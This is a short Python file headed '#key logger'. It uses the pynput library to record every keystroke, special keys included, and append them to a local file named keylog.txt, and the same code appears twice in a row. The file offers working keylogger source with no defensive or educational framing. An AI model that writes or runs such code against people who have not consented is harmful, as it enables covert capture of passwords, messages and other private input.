#key logger
from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., shift, enter, etc.)
        with open("keylog.txt", "a") as f:
            f.write(f"[{key}]")

# Start listening to keyboard input
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., shift, enter, etc.)
        with open("keylog.txt", "a") as f:
            f.write(f"[{key}]")

# Start listening to keyboard input
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
